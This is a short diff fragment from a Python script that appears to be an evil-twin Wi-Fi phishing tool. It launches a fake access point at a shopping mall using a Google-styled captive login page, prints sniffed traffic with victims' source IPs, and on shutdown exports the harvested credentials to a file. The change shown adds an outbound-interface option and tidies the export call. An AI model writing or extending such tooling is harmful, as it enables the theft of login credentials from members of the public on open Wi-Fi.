+    cp.on_sniff_data = lambda d: print(f"[SNIFF] {d.data_type} {d.source_ip} {d.value[:60]}")
 
-    cp.start(ssid=ssid, channel=6, template="google", venue="Centro Comercial")
+    cp.start(ssid=ssid, channel=6, template="google",
+             venue="Centro Comercial", out_interface=out_if)
 
     try:
         while cp.running:
@@ -688,5 +655,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         cp.stop()
         if cp.captured_creds:
-            out = cp.export_credentials()
-            print(f"\nCredenciales guardadas en: {out}")
+            print(f"\nCredenciales guardadas en: {cp.export_credentials()}")
